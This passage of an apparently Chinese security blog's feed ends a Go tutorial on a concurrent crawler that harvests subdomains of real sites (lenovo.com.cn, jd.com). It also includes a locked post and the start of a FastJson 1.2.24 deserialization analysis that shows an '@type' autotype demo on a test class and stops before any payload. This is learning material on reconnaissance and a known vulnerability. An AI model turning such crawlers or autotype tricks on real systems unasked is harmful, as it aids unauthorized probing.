class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"net/url"</span></span><br><span class="line"><span class="string">"regexp"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">first:=<span class="string">"https://www.lenovo.com.cn"</span></span><br><span class="line">resp, err := http.Get(first)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">links := collectlinks.All(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">urls,err:=url.Parse(link)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"lenovo.com"</span>)&#123;</span><br><span class="line">sublists=<span class="built_in">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sublists=remove(sublists)</span><br><span class="line"><span class="keyword">for</span> _,sublist:=<span class="keyword">range</span> sublists&#123;</span><br><span class="line">fmt.Println(sublist)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> reg&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">result = <span class="built_in">append</span>(result, item)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210327191705.png" alt></p><h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>第四步我们实现循环爬取的功能，首先我们将之前的主函数封装为crawl爬虫函数:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">func crawl(uri string) []string &#123;</span><br><span class="line">fmt.Println(uri)</span><br><span class="line">sublists := make([]string, 0)</span><br><span class="line">resp, <span class="keyword">err</span> := http.<span class="built_in">Get</span>(uri)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">Print</span>(<span class="keyword">err</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> resp.StatusCode != 200 &#123;</span><br><span class="line"><span class="keyword">log</span>.<span class="keyword">Print</span>(<span class="keyword">err</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">links := collectlinks.All(resp.Body)</span><br><span class="line">resp.Body.<span class="keyword">Close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">urls,<span class="keyword">err</span>:=url.<span class="keyword">Parse</span>(link)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">err</span>!=nil &#123;</span><br><span class="line"><span class="keyword">log</span>.Println(<span class="keyword">err</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"lenovo.com"</span>)&#123;</span><br><span class="line">sublists=<span class="keyword">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sublists=remove(sublists)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sublists</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在主函数中进行循环爬取：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">func</span> <span class="selector-tag">main</span>() &#123;</span><br><span class="line"><span class="attribute">sublists</span>:=<span class="built_in">make</span>([]string,<span class="number">0</span>)</span><br><span class="line">seen:=<span class="built_in">make</span>(map[string]bool)</span><br><span class="line">sublists = <span class="built_in">append</span>(sublists,<span class="string">"http://www.lenovo.com.cn"</span>)</span><br><span class="line">for <span class="built_in">len</span>(sublists) &gt; <span class="number">0</span> &#123;</span><br><span class="line">items := sublists</span><br><span class="line">sublists = nil</span><br><span class="line">for _, item := range items &#123;</span><br><span class="line">if !seen[item] &#123;</span><br><span class="line">seen[item] = true</span><br><span class="line">sublists = <span class="built_in">append</span>(sublists, crawl(item)...)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里爬了下jd，效果还是挺明显的:</p><p><img src="/2021/04/03/golang-xue-xi-bian-xie-pa-chong/QQ%E6%88%AA%E5%9B%BE20210327195637.png" alt></p><p>​    这里在爬取过程会遇到一个异常:dial tcp: lookup help.en.jd.com: no such host,</p><p>意思大概是获取到的域名不能解析，所以我们需要使用defer+recover来捕获异常。防止程序直接退出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">crawl</span><span class="params">(uri <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">fmt.Println(uri)</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">resp, err1 := http.Get(uri)</span><br><span class="line"><span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Print(err1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">links := collectlinks.All(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">urls,err:=url.Parse(link)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"jd.com"</span>)&#123;</span><br><span class="line">sublists=<span class="built_in">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sublists=remove(sublists)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sublists</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">sublists:=<span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>)</span><br><span class="line">seen:=<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line">sublists = <span class="built_in">append</span>(sublists,<span class="string">"https://www.jd.com"</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(sublists) &gt; <span class="number">0</span> &#123;</span><br><span class="line">items := sublists</span><br><span class="line">sublists = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> items &#123;</span><br><span class="line"><span class="keyword">if</span> !seen[item] &#123;</span><br><span class="line">seen[item] = <span class="literal">true</span></span><br><span class="line">sublists=<span class="built_in">append</span>(sublists,crawl(item)...)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> reg&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">result = <span class="built_in">append</span>(result, item)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h4><p>最后一步我们来实现并发功能：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"net/url"</span></span><br><span class="line"><span class="string">"regexp"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">worklist := <span class="built_in">make</span>(<span class="keyword">chan</span> []<span class="keyword">string</span>)</span><br><span class="line">sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">seen := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line">sublists = <span class="built_in">append</span>(sublists, <span class="string">"https://www.jd.com"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; worklist &lt;- sublists &#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> list := <span class="keyword">range</span> worklist &#123;</span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> list &#123;</span><br><span class="line"><span class="keyword">if</span> !seen[link] &#123;</span><br><span class="line">seen[link] = <span class="literal">true</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(link <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">worklist &lt;- crawl(link)</span><br><span class="line">&#125;(link)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step6"><a href="#Step6" class="headerlink" title="Step6"></a>Step6</h4><p>最后在主函数使用flag包获取命令行参数，传入函数执行即可。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag.<span class="constructor">StringVar(&amp;<span class="params">ur1</span>, <span class="string">"u"</span>,<span class="string">""</span>,<span class="string">"待爬url,如http://www.jd.com"</span>)</span></span><br><span class="line">flag.<span class="constructor">StringVar(&amp;<span class="params">domain</span>, <span class="string">"s"</span>,<span class="string">""</span>,<span class="string">"域名,如jd.com"</span>)</span></span><br><span class="line">flag.<span class="constructor">Parse()</span></span><br></pre></td></tr></table></figure><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>完整代码:<a href="https://github.com/Shu1L/go_jsspider" target="_blank" rel="noopener">Shu1L/go_jsspider: 用go编写的简单爬取页面js的脚本 (github.com)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;​    学习了一段时间的go，觉得自己应该实际上手写一些东西，之前一直使用在三只师傅python写的jsfinder,就想着用go写一个类
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>java审计垃圾洞系列集合</title>
    <link href="https://shu1l.github.io/2021/03/29/java-shen-ji-la-ji-dong-xi-lie-ji-he/"/>
    <id>https://shu1l.github.io/2021/03/29/java-shen-ji-la-ji-dong-xi-lie-ji-he/</id>
    <published>2021-03-29T01:10:35.000Z</published>
    <updated>2021-04-02T11:18:07.844Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e5706c60a0c131afc24e030929d37f16296f3be27525603b16dfea89a4af64df"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>java安全--FastJson 1.2.22-1.2.24漏洞分析</title>
    <link href="https://shu1l.github.io/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/"/>
    <id>https://shu1l.github.io/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/</id>
    <published>2021-03-02T07:03:22.000Z</published>
    <updated>2021-08-20T04:43:12.685Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换。最近几年fastjson爆出了不少漏洞，但源头还是fastjson1.2.24爆出的反序列化漏洞,本文记录学习调试该漏洞的过程。</p><h3 id="初探fastjosn反序列化"><a href="#初探fastjosn反序列化" class="headerlink" title="初探fastjosn反序列化"></a>初探fastjosn反序列化</h3><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>Fastjson在进行反序列化操作时，并没有使用默认的readObject()，而是自己实现了一套反序列化机制。我们通过操作操作属性的setter getter方法结合一些特殊类从而实现任意命令执行。</p><h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h4><p>我们可以首先构造一个User类:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(<span class="keyword">String</span> name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用fastjson来对构造的类进行序列化:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String serializedStr = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span><span class="keyword">to</span><span class="constructor">JSONString(<span class="params">user1</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br></pre></td></tr></table></figure><p>fastjson可以使用三种形式进行反序列化:</p><ul><li>通过parse方法进行反序列化，<strong>parse在解析过程中会调用目标类中的特定setter方法和getter方法</strong></li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object obj1 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse(serializedStr);</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br></pre></td></tr></table></figure><ul><li>通过parseObject反序列化，不需要指定类,返回JSONObject。parseObject只是对parse进行了简单的封装。</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object obj2 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="params">serializedStr</span>)</span>;</span><br><span class="line">   <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line">   <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br></pre></td></tr></table></figure><ul><li>通过parseObject({},class),指定类，返回一个相应的类对象。</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object obj3 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="params">serializedStr</span>,User.<span class="params">class</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br></pre></td></tr></table></figure><p>最后的结果如下:</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228204357.png" alt></p><h5 id="三个反序列化方法的区别"><a href="#三个反序列化方法的区别" class="headerlink" title="三个反序列化方法的区别"></a>三个反序列化方法的区别</h5><p>关于parse (String text) 、parseObject(String text)、 parseObject(String text, Class<T> clazz)三个方法，我们进行一个测试:</T></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package com.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> FastJsonTest &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String <span class="type">name</span>;</span><br><span class="line">    <span class="built_in">public</span> String age;</span><br><span class="line">    <span class="built_in">public</span> FastJsonTest() throws IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> <span class="type">void</span> setName(String test) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("name setter called");</span><br><span class="line">        this.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String getName() &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("name getter called");</span><br><span class="line">        <span class="keyword">return</span> this.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String setAge(String test) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("Age setter called");</span><br><span class="line">        this.name = test;</span><br><span class="line">        <span class="keyword">return</span> this.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String getAge()&#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("age getter called");</span><br><span class="line">        <span class="keyword">return</span> this.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">        <span class="keyword">Object</span> obj = <span class="type">JSON</span>.parse("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;");</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj2 = <span class="type">JSON</span>.parseObject("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span 